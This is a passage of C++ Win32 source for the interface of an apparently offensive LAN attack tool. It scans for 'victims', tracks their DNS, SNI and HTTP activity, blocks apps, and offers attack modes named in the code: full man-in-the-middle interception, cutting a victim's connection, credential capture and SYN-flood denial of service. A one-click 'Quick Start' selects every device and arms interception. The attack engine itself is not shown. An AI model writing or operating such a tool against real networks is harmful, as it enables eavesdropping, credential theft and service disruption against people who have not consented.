    EnableWindow(parent, FALSE);
    ShowWindow(hDlg, SW_SHOW);

    MSG msg;
    while (IsWindow(hDlg) && GetMessageW(&msg, NULL, 0, 0)) {
        // gives Enter=OK, Esc=Cancel and Tab between the edit and buttons
        if (!IsDialogMessageW(hDlg, &msg)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }
    EnableWindow(parent, TRUE);
    SetForegroundWindow(parent);
    return g_promptResult;
}

// ---------------------------------------------------------------
// list polish helpers (live filter + click-to-sort)
// ---------------------------------------------------------------
static std::string lowerStr(std::string s) {
    for (auto& c : s) c = (char)tolower((unsigned char)c);
    return s;
}

static int cmpIpText(const std::string& a, const std::string& b) {
    // compare octets numerically without pulling in winsock
    unsigned x[4] = {0, 0, 0, 0}, y[4] = {0, 0, 0, 0};
    sscanf(a.c_str(), "%u.%u.%u.%u", &x[0], &x[1], &x[2], &x[3]);
    sscanf(b.c_str(), "%u.%u.%u.%u", &y[0], &y[1], &y[2], &y[3]);
    for (int i = 0; i < 4; ++i)
        if (x[i] != y[i]) return x[i] < y[i] ? -1 : 1;
    return 0;
}

static bool victimMatchesFilter(const Victim& v, const std::string& f) {
    if (f.empty()) return true;
    std::string blob = v.ip + " " + v.mac + " " + v.name + " " + v.ports + " " + v.os;
    return lowerStr(blob).find(f) != std::string::npos;
}

static void setSortIndicator(HWND hLV, int col, bool asc) {
#ifdef HDF_SORTUP
    HWND hdr = ListView_GetHeader(hLV);
    if (!hdr) return;
    int n = Header_GetItemCount(hdr);
    for (int i = 0; i < n; ++i) {
        HDITEMW hi = {0};
        wchar_t buf[128] = {0};
        hi.mask = HDI_TEXT | HDI_FORMAT;
        hi.pszText = buf;
        hi.cchTextMax = 128;
        if (!Header_GetItem(hdr, i, &hi)) continue;
        hi.fmt &= ~(HDF_SORTUP | HDF_SORTDOWN);
        if (i == col) hi.fmt |= (asc ? HDF_SORTUP : HDF_SORTDOWN);
        Header_SetItem(hdr, i, &hi);
    }
#else
    (void)hLV; (void)col; (void)asc;
#endif
}

// ---------------------------------------------------------------
// listview refresh
// ---------------------------------------------------------------
void refreshVictimsLV(HWND hLV) {
    if (!hLV) return;
    // snapshot under the lock, then touch the control: never hold g_stateMutex
    // while calling into the listview (its notifications run in this thread)
    std::vector<Victim> snap;
    {
        std::lock_guard<std::mutex> lk(g_stateMutex);
        snap = g_victims;
    }

    struct Row { size_t idx; Victim v; };
    std::vector<Row> rows;
    rows.reserve(snap.size());
    for (size_t i = 0; i < snap.size(); ++i) {
        if (!victimMatchesFilter(snap[i], g_filterText)) continue;
        rows.push_back(Row{ i, snap[i] });
    }
    if (g_victimSortCol >= 0) {
        int c = g_victimSortCol;
        bool asc = g_victimSortAsc;
        std::stable_sort(rows.begin(), rows.end(),
            [&](const Row& a, const Row& b) {
                int r = 0;
                switch (c) {
                    case 0: r = (a.idx < b.idx) ? -1 : (a.idx > b.idx ? 1 : 0); break;
                    case 1: r = cmpIpText(a.v.ip, b.v.ip); break;
                    case 2: r = _stricmp(a.v.mac.c_str(), b.v.mac.c_str()); break;
                    case 3: r = _stricmp(a.v.name.c_str(), b.v.name.c_str()); break;
                    case 4: r = _stricmp(a.v.ports.c_str(), b.v.ports.c_str()); break;
                    case 5: r = _stricmp(a.v.os.c_str(), b.v.os.c_str()); break;
                }
                return asc ? (r < 0) : (r > 0);
            });
    }

    int top = ListView_GetTopIndex(hLV);
    g_updatingVictimsLV = true;
    ListView_DeleteAllItems(hLV);
    {
        for (size_t i = 0; i < rows.size(); ++i) {
            const Victim& v = rows[i].v;
            wchar_t wbuf[256];
            LVITEMW item = {0};
            item.mask = LVIF_TEXT;
            item.iItem = (int)i;
            swprintf_s(wbuf, L"%zu", rows[i].idx + 1);
            item.pszText = wbuf;
            ListView_InsertItem(hLV, &item);
            MultiByteToWideChar(CP_UTF8, 0, v.ip.c_str(), -1, wbuf, 256);
            ListView_SetItemText(hLV, (int)i, 1, wbuf);
            MultiByteToWideChar(CP_UTF8, 0, v.mac.c_str(), -1, wbuf, 256);
            ListView_SetItemText(hLV, (int)i, 2, wbuf);
            MultiByteToWideChar(CP_UTF8, 0, v.name.c_str(), -1, wbuf, 256);
            ListView_SetItemText(hLV, (int)i, 3, wbuf);
            MultiByteToWideChar(CP_UTF8, 0, v.ports.c_str(), -1, wbuf, 256);
            ListView_SetItemText(hLV, (int)i, 4, wbuf);
            std::string ostext = v.os;
            if (!v.banner.empty()) ostext += "  [" + v.banner + "]";
            MultiByteToWideChar(CP_UTF8, 0, ostext.c_str(), -1, wbuf, 256);
            ListView_SetItemText(hLV, (int)i, 5, wbuf);
            ListView_SetCheckState(hLV, (int)i, v.sel);
        }
    }
    g_updatingVictimsLV = false;
    if (top > 0 && top < ListView_GetItemCount(hLV))
        ListView_EnsureVisible(hLV, top, FALSE);
    if (g_hEmptyState) {
        bool empty = (ListView_GetItemCount(hLV) == 0);
        ShowWindow(g_hEmptyState, empty ? SW_SHOW : SW_HIDE);
    }
}

void refreshActivityLV(HWND hLV) {
    if (!hLV) return;
    std::vector<Activity> snap;
    {
        std::lock_guard<std::mutex> lk(g_stateMutex);
        snap = g_activity;
    }
    if (g_activitySortCol >= 0) {
        int c = g_activitySortCol;
        bool asc = g_activitySortAsc;
        std::stable_sort(snap.begin(), snap.end(),
            [&](const Activity& a, const Activity& b) {
                int r = 0;
                switch (c) {
                    case 0: r = cmpIpText(a.ip, b.ip); break;
                    case 1: r = _stricmp(a.name.c_str(), b.name.c_str()); break;
                    case 2: r = (a.dns < b.dns) ? -1 : (a.dns > b.dns ? 1 : 0); break;
                    case 3: r = (a.sni < b.sni) ? -1 : (a.sni > b.sni ? 1 : 0); break;
                    case 4: r = (a.http < b.http) ? -1 : (a.http > b.http ? 1 : 0); break;
                    case 5: r = (a.age < b.age) ? -1 : (a.age > b.age ? 1 : 0); break;
                    case 6: r = (a.events < b.events) ? -1 : (a.events > b.events ? 1 : 0); break;
                }
                return asc ? (r < 0) : (r > 0);
            });
    }
    int top = ListView_GetTopIndex(hLV);
    ListView_DeleteAllItems(hLV);
    for (size_t i = 0; i < snap.size(); ++i) {
        auto& a = snap[i];
        wchar_t wbuf[256];
        LVITEMW item = {0};
        item.mask = LVIF_TEXT;
        item.iItem = (int)i;
        MultiByteToWideChar(CP_UTF8, 0, a.ip.c_str(), -1, wbuf, 256);
        item.pszText = wbuf;
        ListView_InsertItem(hLV, &item);
        MultiByteToWideChar(CP_UTF8, 0, a.name.c_str(), -1, wbuf, 256);
        ListView_SetItemText(hLV, (int)i, 1, wbuf);
        swprintf_s(wbuf, L"%ld", a.dns);
        ListView_SetItemText(hLV, (int)i, 2, wbuf);
        swprintf_s(wbuf, L"%ld", a.sni);
        ListView_SetItemText(hLV, (int)i, 3, wbuf);
        swprintf_s(wbuf, L"%ld", a.http);
        ListView_SetItemText(hLV, (int)i, 4, wbuf);
        swprintf_s(wbuf, L"%lus", a.age);
        ListView_SetItemText(hLV, (int)i, 5, wbuf);
        swprintf_s(wbuf, L"%llu", a.events);
        ListView_SetItemText(hLV, (int)i, 6, wbuf);
    }
    if (top > 0 && top < ListView_GetItemCount(hLV))
        ListView_EnsureVisible(hLV, top, FALSE);
}

// refresh only the AGE column: the table doesn't need a rebuild every second
// just because a number went up, and rebuilding would lose selection/focus
void updateActivityAges(HWND hLV) {
    if (!hLV) return;
    std::vector<Activity> snap;
    {
        std::lock_guard<std::mutex> lk(g_stateMutex);
        snap = g_activity;
    }
    int rows = ListView_GetItemCount(hLV);
    if (rows != (int)snap.size()) { refreshActivityLV(hLV); return; }
    // match rows by IP, not by index: the engine's unordered_map order can
    // change between frames even when the set of hosts is unchanged
    for (int i = 0; i < rows; ++i) {
        wchar_t wip[64] = {0};
        ListView_GetItemText(hLV, i, 0, wip, 64);
        char ip[64] = {0};
        WideCharToMultiByte(CP_UTF8, 0, wip, -1, ip, 64, NULL, NULL);
        for (auto& a : snap) {
            if (a.ip != ip) continue;
            wchar_t wbuf[32];
            swprintf_s(wbuf, L"%lus", a.age);
            ListView_SetItemText(hLV, i, 5, wbuf);
            swprintf_s(wbuf, L"%llu", a.events);
            ListView_SetItemText(hLV, i, 6, wbuf);
            break;
        }
    }
}

static std::wstring toWide(const std::string& s) {
    if (s.empty()) return std::wstring();
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
    if (n <= 1) return std::wstring();
    std::wstring w((size_t)n - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], n);
    return w;
}

// rebuild the device picker + event view for the focused device
void refreshTimeline() {
    std::vector<Activity> acts;
    std::vector<std::pair<std::string, std::string>> evs;
    std::string engineFocus;
    std::string statsIp, statsText;
    bool cap = false;
    {
        std::lock_guard<std::mutex> lk(g_stateMutex);
        acts = g_activity;
        evs = g_events;
        engineFocus = g_status.focus;
        cap = g_status.cap;
        statsIp = g_statsIp;
        statsText = g_statsText;
    }

    // if the user has not picked a device yet, adopt the engine's focus or
    // auto-focus the first device that produced activity
    if (g_timelineIp.empty()) {
        if (!engineFocus.empty()) {
            g_timelineIp = engineFocus;
        } else if (!acts.empty()) {
            g_timelineIp = acts[0].ip;
            sendCmd("_focus " + g_timelineIp);
        }
    }

    if (g_hTimelineCombo) {
        bool changed = (acts.size() != g_comboIps.size());
        if (!changed)
            for (size_t i = 0; i < acts.size(); ++i)
                if (acts[i].ip != g_comboIps[i]) { changed = true; break; }
        if (changed) {
            g_updatingTimelineCombo = true;
            SendMessageW(g_hTimelineCombo, CB_RESETCONTENT, 0, 0);
            g_comboIps.clear();
            int sel = -1;
            for (size_t i = 0; i < acts.size(); ++i) {
                std::string label = acts[i].ip;
                if (!acts[i].name.empty() && acts[i].name != "-")
                    label += "  " + acts[i].name;
                std::wstring w = toWide(label);
                int idx = (int)SendMessageW(g_hTimelineCombo, CB_ADDSTRING, 0, (LPARAM)w.c_str());
                if (idx >= 0) {
                    SendMessageW(g_hTimelineCombo, CB_SETITEMDATA, idx, (LPARAM)i);
                    g_comboIps.push_back(acts[i].ip);
                    if (acts[i].ip == g_timelineIp) sel = idx;
                }
            }
            if (sel >= 0) SendMessageW(g_hTimelineCombo, CB_SETCURSEL, sel, 0);
            g_updatingTimelineCombo = false;
        } else {
            for (size_t i = 0; i < g_comboIps.size(); ++i)
                if (g_comboIps[i] == g_timelineIp) {
                    SendMessageW(g_hTimelineCombo, CB_SETCURSEL, (WPARAM)i, 0);
                    break;
                }
        }
    }

    std::string txt;
    if (!statsText.empty() && statsIp == g_timelineIp) {
        txt += "-- " + g_timelineIp + " -------------------------\r\n";
        txt += statsText + "\r\n";
        txt += "---------------------------------------------\r\n";
    }
    for (auto& e : evs) {
        if (!g_timelineIp.empty() && e.first != g_timelineIp) continue;
        if (!txt.empty()) txt += "\r\n";
        txt += e.second;
    }
    if (g_hTimelineEdit && txt != g_timelineText) {
        g_timelineText = txt;
        std::wstring w = toWide(txt);
        SetWindowTextW(g_hTimelineEdit, w.c_str());
        SendMessageW(g_hTimelineEdit, EM_SETSEL, (WPARAM)-1, (LPARAM)-1);
        SendMessageW(g_hTimelineEdit, EM_SCROLLCARET, 0, 0);
    }

    if (g_hCapCheck && !g_updatingCapCheck) {
        bool checked = SendMessageW(g_hCapCheck, BM_GETCHECK, 0, 0) == BST_CHECKED;
        if (checked != cap) {
            g_updatingCapCheck = true;
            SendMessageW(g_hCapCheck, BM_SETCHECK, cap ? BST_CHECKED : BST_UNCHECKED, 0);
            g_updatingCapCheck = false;
        }
    }
}

void setTimelineFocus(const std::string& ip) {
    if (ip.empty()) return;
    g_timelineIp = ip;
    g_timelineText.clear();
    sendCmd("_focus " + ip);
    refreshTimeline();
}

void refreshRulesLV(HWND hLV) {
    if (!hLV) return;
    std::vector<Rule> snap;
    {
        std::lock_guard<std::mutex> lk(g_stateMutex);
        snap = g_rules;
    }
    int top = ListView_GetTopIndex(hLV);
    ListView_DeleteAllItems(hLV);
    for (size_t i = 0; i < snap.size(); ++i) {
        auto& r = snap[i];
        wchar_t wbuf[256];
        LVITEMW item = {0};
        item.mask = LVIF_TEXT;
        item.iItem = (int)i;
        MultiByteToWideChar(CP_UTF8, 0, r.pattern.c_str(), -1, wbuf, 256);
        item.pszText = wbuf;
        ListView_InsertItem(hLV, &item);
        MultiByteToWideChar(CP_UTF8, 0, r.action.c_str(), -1, wbuf, 256);
        ListView_SetItemText(hLV, (int)i, 1, wbuf);
        MultiByteToWideChar(CP_UTF8, 0, r.target.c_str(), -1, wbuf, 256);
        ListView_SetItemText(hLV, (int)i, 2, wbuf);
        MultiByteToWideChar(CP_UTF8, 0, r.victim.c_str(), -1, wbuf, 256);
        ListView_SetItemText(hLV, (int)i, 3, wbuf);
    }
    if (top > 0 && top < ListView_GetItemCount(hLV))
        ListView_EnsureVisible(hLV, top, FALSE);
}

void refreshAppsLV(HWND hLV) {
    if (!hLV) return;
    std::vector<AppEntry> snap;
    {
        std::lock_guard<std::mutex> lk(g_stateMutex);
        snap = g_apps;
    }
    int top = ListView_GetTopIndex(hLV);
    ListView_DeleteAllItems(hLV);
    for (size_t i = 0; i < snap.size(); ++i) {
        auto& e = snap[i];
        wchar_t wbuf[256];
        LVITEMW item = {0};
        item.mask = LVIF_TEXT;
        item.iItem = (int)i;
        MultiByteToWideChar(CP_UTF8, 0, e.victim.c_str(), -1, wbuf, 256);
        item.pszText = wbuf;
        ListView_InsertItem(hLV, &item);
        MultiByteToWideChar(CP_UTF8, 0, e.app.c_str(), -1, wbuf, 256);
        ListView_SetItemText(hLV, (int)i, 1, wbuf);
        wcscpy(wbuf, e.blocked ? L"blocked" : L"open");
        ListView_SetItemText(hLV, (int)i, 2, wbuf);
    }
    if (top > 0 && top < ListView_GetItemCount(hLV))
        ListView_EnsureVisible(hLV, top, FALSE);
}

// ---------------------------------------------------------------
// status text
// ---------------------------------------------------------------
void updateStatusText() {
    std::lock_guard<std::mutex> lk(g_stateMutex);
    wchar_t buf[1200];
    const wchar_t* modeNames[] = {L"-", L"intercept", L"tap", L"block",
                                   L"record", L"strip", L"dos"};
    const wchar_t* mn = (g_status.mode >= 1 && g_status.mode <= 6)
                        ? modeNames[g_status.mode] : L"-";
    swprintf_s(buf, 1200,
        L"  %s  |  %d / %d targets  |  mode: %s  |  fwd: %s  |  portal: %s  "
        L"|  seen: %ld  dns: %ld  kills: %ld  sent: %ld  rep: %ld%s",
        g_status.attack ? L"[ ATTACKING ]" : (g_status.scanning ? L"[ SCANNING ]" : L"[ idle ]"),
        g_status.selected, g_status.victims, mn,
        g_status.fwd ? L"on" : L"off",
        g_status.portal ? L"on" : L"off",
        g_status.seen, g_status.dns, g_status.kills, g_status.sent, g_status.rep,
        g_status.scanning ? L"  (scanning network...)" : L"");
    if (g_status.gwm > 0) {
        wchar_t warn[96];
        swprintf_s(warn, L"   [gateway MAC changed %ldx]", g_status.gwm);
        wcscat_s(buf, 1200, warn);
    }
    if (!g_status.myip.empty()) {
        wchar_t wip[64] = {0}, wgw[64] = {0};
        MultiByteToWideChar(CP_UTF8, 0, g_status.myip.c_str(), -1, wip, 64);
        if (!g_status.gw.empty())
            MultiByteToWideChar(CP_UTF8, 0, g_status.gw.c_str(), -1, wgw, 64);
        wchar_t extra[180];
        swprintf_s(extra, L"   |  me: %s  gw: %s", wip, wgw[0] ? wgw : L"-");
        wcscat_s(buf, 1200, extra);
    }
    if (!g_status.attack && g_status.victims == 0 && !g_status.scanning)
        wcscat_s(buf, 1200, L"   ->  click \"Scan Network\" to find devices");
    SetWindowTextW(g_hStatusText, buf);
}

// ---------------------------------------------------------------
// log syncing
// ---------------------------------------------------------------
void flushLogToEdit() {
    std::string chunk;
    {
        std::lock_guard<std::mutex> lk(g_logMutex);
        if (g_logReadPos >= g_logBuf.size()) return;
        chunk = g_logBuf.substr(g_logReadPos);
        g_logReadPos = g_logBuf.size();
    }
    if (chunk.empty()) return;

    int curLen = GetWindowTextLengthW(g_hLogEdit);
    if (curLen > 200000) {
        std::string tail;
        {
            std::lock_guard<std::mutex> lk(g_logMutex);
            size_t keepFrom = g_logBuf.size() > 100000 ? g_logBuf.size() - 100000 : 0;
            tail = g_logBuf.substr(keepFrom);
        }
        int wl = MultiByteToWideChar(CP_UTF8, 0, tail.c_str(), -1, NULL, 0);
        std::wstring ws(wl > 0 ? wl : 1, 0);
        if (wl > 1) MultiByteToWideChar(CP_UTF8, 0, tail.c_str(), -1, &ws[0], wl);
        SetWindowTextW(g_hLogEdit, ws.c_str());
    } else {
        int wl = MultiByteToWideChar(CP_UTF8, 0, chunk.c_str(), -1, NULL, 0);
        std::wstring ws(wl > 0 ? wl : 1, 0);
        if (wl > 1) MultiByteToWideChar(CP_UTF8, 0, chunk.c_str(), -1, &ws[0], wl);
        SendMessageW(g_hLogEdit, EM_SETSEL, curLen, curLen);
        SendMessageW(g_hLogEdit, EM_REPLACESEL, FALSE, (LPARAM)ws.c_str());
    }
    SendMessageW(g_hLogEdit, WM_VSCROLL, SB_BOTTOM, 0);
}

void clearLog() {
    std::lock_guard<std::mutex> lk(g_logMutex);
    g_logBuf.clear();
    g_logReadPos = 0;
    SetWindowTextW(g_hLogEdit, L"");
}

void copyLog() {
    int len = GetWindowTextLengthW(g_hLogEdit);
    if (len <= 0) return;
    HGLOBAL mem = GlobalAlloc(GMEM_MOVEABLE, (len + 1) * sizeof(wchar_t));
    if (!mem) return;
    wchar_t* p = (wchar_t*)GlobalLock(mem);
    GetWindowTextW(g_hLogEdit, p, len + 1);
    GlobalUnlock(mem);
    OpenClipboard(g_hMain);
    EmptyClipboard();
    SetClipboardData(CF_UNICODETEXT, mem);
    CloseClipboard();
}

void saveLog() {
    wchar_t path[MAX_PATH] = L"auto_attack_log.txt";
    OPENFILENAMEW ofn = {sizeof(ofn)};
    ofn.hwndOwner = g_hMain;
    ofn.lpstrFilter = L"Text\0*.txt\0All\0*.*\0";
    ofn.lpstrFile = path;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_OVERWRITEPROMPT;

    if (!GetSaveFileNameW(&ofn)) return;
    int len = GetWindowTextLengthW(g_hLogEdit);
    if (len <= 0) return;
    wchar_t* p = (wchar_t*)malloc((len + 1) * sizeof(wchar_t));
    if (!p) return;
    GetWindowTextW(g_hLogEdit, p, len + 1);

    HANDLE hf = CreateFileW(path, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        int u8len = WideCharToMultiByte(CP_UTF8, 0, p, -1, NULL, 0, NULL, NULL);
        std::string u8(u8len > 1 ? u8len - 1 : 0, 0);
        if (u8len > 1) WideCharToMultiByte(CP_UTF8, 0, p, -1, &u8[0], u8len, NULL, NULL);
        DWORD w = 0;
        WriteFile(hf, u8.data(), (DWORD)u8.size(), &w, NULL);
        CloseHandle(hf);
    }
    free(p);
    appendLog("[+] log saved\r\n");
    PostMessage(g_hMain, WM_APP_LOGNEW, 0, 0);
}

// ---------------------------------------------------------------
// factory helpers
// ---------------------------------------------------------------
HWND makeStatic(HWND parent, const wchar_t* text, int x, int y, int w, int h,
                HFONT font = nullptr) {
    HWND hc = CreateWindowW(L"STATIC", text,
        WS_CHILD | WS_VISIBLE | SS_LEFT,
        x, y, w, h, parent, NULL, g_hInst, NULL);
    SendMessage(hc, WM_SETFONT, (WPARAM)(font ? font : g_fontUI), TRUE);
    return hc;
}

HWND makeButton(HWND parent, const wchar_t* text, int id, int x, int y, int w, int h) {
    HWND hc = CreateWindowW(L"BUTTON", text,
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_FLAT,
        x, y, w, h, parent, (HMENU)(INT_PTR)id, g_hInst, NULL);
    SendMessage(hc, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
    SetWindowTheme(hc, L"DarkMode_Explorer", NULL);
    return hc;
}

HWND makeEdit(HWND parent, int id, int x, int y, int w, int h, bool multi = false) {
    DWORD style = WS_CHILD | WS_VISIBLE | WS_BORDER;
    if (multi) style |= ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL | ES_WANTRETURN;
    else style |= ES_AUTOHSCROLL;
    HWND hc = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"", style,
        x, y, w, h, parent, (HMENU)(INT_PTR)id, g_hInst, NULL);
    SendMessage(hc, WM_SETFONT, (WPARAM)(multi ? g_fontMono : g_fontUI), TRUE);
    return hc;
}

HWND makeCombo(HWND parent, int id, int x, int y, int w) {
    HWND c = CreateWindowW(L"COMBOBOX", L"",
        WS_CHILD | WS_VISIBLE | CBS_DROPDOWNLIST | WS_VSCROLL,
        x, y, w, 220, parent, (HMENU)(INT_PTR)id, g_hInst, NULL);
    SendMessage(c, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
    SetWindowTheme(c, L"DarkMode_Explorer", NULL);
    return c;
}

HWND makeListView(HWND parent, int id, int x, int y, int w, int h) {
    HWND hc = CreateWindowExW(WS_EX_CLIENTEDGE, WC_LISTVIEWW, L"",
        WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS | WS_TABSTOP,
        x, y, w, h, parent, (HMENU)(INT_PTR)id, g_hInst, NULL);
    SendMessage(hc, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
    return hc;
}

std::string lvText(HWND hLV, int col) {
    int sel = ListView_GetNextItem(hLV, -1, LVNI_SELECTED);
    if (sel < 0) return "";
    wchar_t buf[128] = {0};
    ListView_GetItemText(hLV, sel, col, buf, 128);
    char abuf[128] = {0};
    WideCharToMultiByte(CP_UTF8, 0, buf, -1, abuf, 128, NULL, NULL);
    return abuf;
}

void setEditUTF8(HWND hEdit, const std::string& s) {
    if (s.empty()) { SetWindowTextW(hEdit, L""); return; }
    int wl = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
    std::wstring ws(wl > 0 ? wl : 1, 0);
    if (wl > 1) MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &ws[0], wl);
    SetWindowTextW(hEdit, ws.c_str());
}

std::string getEditUTF8(HWND hEdit) {
    int len = GetWindowTextLengthW(hEdit);
    if (len <= 0) return "";
    std::wstring ws(len + 1, 0);
    GetWindowTextW(hEdit, &ws[0], len + 1);
    int u8 = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, NULL, 0, NULL, NULL);
    std::string s(u8 > 1 ? u8 - 1 : 0, 0);
    if (u8 > 1) WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, &s[0], u8, NULL, NULL);
    return s;
}

// ---------------------------------------------------------------
// adapters
// ---------------------------------------------------------------
void populateAdapters() {
    g_adapterNames.clear();
    g_adapterGuids.clear();
    SendMessageW(g_hAdapterCombo, CB_RESETCONTENT, 0, 0);

    PIP_ADAPTER_INFO ai = (PIP_ADAPTER_INFO)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG len = sizeof(IP_ADAPTER_INFO);
    if (GetAdaptersInfo(ai, &len) != ERROR_SUCCESS) {
        free(ai);
        ai = (PIP_ADAPTER_INFO)malloc(len);
        if (GetAdaptersInfo(ai, &len) != ERROR_SUCCESS) { free(ai); return; }
    }
    for (PIP_ADAPTER_INFO p = ai; p; p = p->Next) {
        if (p->Type != MIB_IF_TYPE_ETHERNET &&
            p->Type != IF_TYPE_IEEE80211) continue;
        if (p->IpAddressList.IpAddress.String[0] == '0') continue;
        if (p->GatewayList.IpAddress.String[0] == '0') continue;

        char line[300];
        snprintf(line, sizeof(line), "%s  [%s]",
                 p->Description, p->IpAddressList.IpAddress.String);
        int wl = MultiByteToWideChar(CP_ACP, 0, line, -1, NULL, 0);
        std::wstring ws(wl > 0 ? wl : 1, 0);
        if (wl > 1) MultiByteToWideChar(CP_ACP, 0, line, -1, &ws[0], wl);
        SendMessageW(g_hAdapterCombo, CB_ADDSTRING, 0, (LPARAM)ws.c_str());
        g_adapterNames.push_back(p->Description);
        g_adapterGuids.push_back(p->AdapterName);
    }
    free(ai);
    if (!g_adapterNames.empty()) {
        // restore the adapter used last time (GUID first - descriptions and
        // indexes change); fall back to the first one
        std::string savedGuid = loadSavedAdapterGuid();
        std::string savedDesc = loadSavedAdapter();
        int sel = -1;
        if (!savedGuid.empty())
            for (size_t i = 0; i < g_adapterGuids.size(); ++i)
                if (stricmp(g_adapterGuids[i].c_str(), savedGuid.c_str()) == 0) {
                    sel = (int)i; break;
                }
        if (sel < 0 && !savedDesc.empty())
            for (size_t i = 0; i < g_adapterNames.size(); ++i)
                if (g_adapterNames[i] == savedDesc) { sel = (int)i; break; }
        if (sel < 0) sel = 0;
        SendMessageW(g_hAdapterCombo, CB_SETCURSEL, sel, 0);
        g_adapterIndex = sel + 1;
        if (sel < (int)g_adapterGuids.size()) g_adapterGuid = g_adapterGuids[sel];
        // record the resolved choice on first run too, so the adapter is
        // remembered even if the user never opens the dropdown
        if (sel >= 0 && sel < (int)g_adapterNames.size() &&
            sel < (int)g_adapterGuids.size())
            saveAdapter(g_adapterNames[sel], g_adapterGuids[sel]);
    }
}

// ---------------------------------------------------------------
// page builders
// ---------------------------------------------------------------
void setupLV(HWND hLV, const wchar_t** cols, const int* widths, int ncols) {
    ListView_SetExtendedListViewStyle(hLV,
        LVS_EX_FULLROWSELECT | LVS_EX_DOUBLEBUFFER | LVS_EX_GRIDLINES);
    SetWindowTheme(hLV, L"DarkMode_Explorer", NULL);
    ListView_SetBkColor(hLV, COL_PANEL);
    ListView_SetTextBkColor(hLV, COL_PANEL);
    ListView_SetTextColor(hLV, COL_TEXT);
    for (int i = 0; i < ncols; ++i) {
        LVCOLUMNW c = {0};
        c.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;
        c.pszText = (LPWSTR)cols[i];
        c.cx = widths[i];
        c.iSubItem = i;
        ListView_InsertColumn(hLV, i, &c);
    }
}

void buildSetupPage(HWND page) {
    int y = 10;
    makeButton(page, L"Scan Network",   ID_SCAN,       8,   y, 110, 30);
    makeButton(page, L"Quick Start",    ID_QUICK,      124, y, 100, 30);
    makeButton(page, L"Resolve Names",  ID_NAMES,      230, y, 110, 30);
    makeButton(page, L"Fingerprint",    ID_FINGERPRINT,346, y, 110, 30);
    makeButton(page, L"Select All",     ID_SELECT_ALL, 462, y, 90, 30);
    makeButton(page, L"Select None",    ID_SELECT_NONE,558, y, 90, 30);
    makeButton(page, L"Toggle Forward", ID_FWD,        654, y, 120, 30);
    makeButton(page, L"How To Use",     ID_HELP,       780, y, 110, 30);

    makeStatic(page, L"Devices on network", 8, 50, 400, 20, g_fontBold);
    makeStatic(page, L"Filter:", 552, 52, 52, 20, g_fontBold);
    g_hFilterEdit = makeEdit(page, ID_FILTER, 610, 50, 290, 24);
    g_hVictimLV = makeListView(page, ID_VICTIM_LV, 8, 74, 900, 340);
    ListView_SetExtendedListViewStyle(g_hVictimLV,
        LVS_EX_FULLROWSELECT | LVS_EX_DOUBLEBUFFER | LVS_EX_GRIDLINES |
        LVS_EX_CHECKBOXES);
    SetWindowTheme(g_hVictimLV, L"DarkMode_Explorer", NULL);
    ListView_SetBkColor(g_hVictimLV, COL_PANEL);
    ListView_SetTextBkColor(g_hVictimLV, COL_PANEL);
    ListView_SetTextColor(g_hVictimLV, COL_TEXT);

    g_hEmptyState = makeStatic(page,
        L"No devices found yet.\nClick \"Scan Network\" to discover devices on your LAN.",
        8, 180, 900, 60, nullptr);
    // center the text
    SetWindowLongW(g_hEmptyState, GWL_STYLE,
        GetWindowLongW(g_hEmptyState, GWL_STYLE) | SS_CENTER);

    const wchar_t* cols[] = {L"#", L"IP", L"MAC", L"Hostname", L"Ports", L"OS"};
    const int widths[] = {36, 118, 132, 190, 190, 150};
    for (int i = 0; i < 6; ++i) {
        LVCOLUMNW c = {0};
        c.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;
        c.pszText = (LPWSTR)cols[i];
        c.cx = widths[i];
        c.iSubItem = i;
        ListView_InsertColumn(g_hVictimLV, i, &c);
    }

    int bottomY = 430;
    g_hModeLabel = makeStatic(page, L"Attack mode:", 8, bottomY + 6, 100, 22, g_fontBold);
    g_hModeCombo = makeCombo(page, ID_MODE_COMBO, 110, bottomY, 320);
    SendMessageW(g_hModeCombo, CB_ADDSTRING, 0, (LPARAM)L"1 - Intercept  (full MITM, victim keeps net)");
    SendMessageW(g_hModeCombo, CB_ADDSTRING, 0, (LPARAM)L"2 - Tap        (one-way, gateway untouched)");
    SendMessageW(g_hModeCombo, CB_ADDSTRING, 0, (LPARAM)L"3 - Block      (cut victim's net)");
    SendMessageW(g_hModeCombo, CB_ADDSTRING, 0, (LPARAM)L"4 - Record     (MITM + credential capture)");
    SendMessageW(g_hModeCombo, CB_ADDSTRING, 0, (LPARAM)L"5 - Strip      (reserved: same as Intercept)");
    SendMessageW(g_hModeCombo, CB_ADDSTRING, 0, (LPARAM)L"6 - DoS        (SYN flood selected)");
    SendMessageW(g_hModeCombo, CB_SETCURSEL, 0, 0);

    makeButton(page, L"START ATTACK", ID_START, 448, bottomY - 4, 160, 36);
    makeButton(page, L"STOP & REPAIR", ID_STOP, 616, bottomY - 4, 160, 36);

    g_hTipLabel = makeStatic(page,
        L"Tip: 'Quick Start' = scan + select all + intercept + arm. Shortcuts: F5=Scan, Enter=Start, Esc=Stop.",
        8, bottomY + 60, 780, 20, nullptr);
}

void buildTrackingPage(HWND page) {
    int y = 10;
    makeButton(page, L"Refresh",         ID_REFRESH_ACT, 8,   y, 90, 30);
    makeButton(page, L"Top 10",          ID_TOP,         104, y, 90, 30);
    makeButton(page, L"Resolve Names",   ID_NAMES2,      200, y, 110, 30);
